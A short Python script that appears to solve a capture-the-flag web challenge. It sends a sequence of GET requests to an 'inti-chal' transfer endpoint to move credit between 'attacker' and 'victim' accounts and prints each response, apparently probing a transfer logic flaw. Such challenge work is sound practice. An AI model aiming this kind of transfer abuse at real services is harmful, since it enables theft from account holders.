from requests import get

attacker = get("http://inti-chal/transfer/attacker/victim/5")
victim = get("http://inti-chal/transfer/victim/attacker/5")
attacker2 = get("http://inti-chal/transfer/attacker/victim/5")

print("on attacker mail: " + attacker.text)
print("on vicitim mail:  " + victim.text)
print("on attacker mail: " + attacker2.text +"\n")
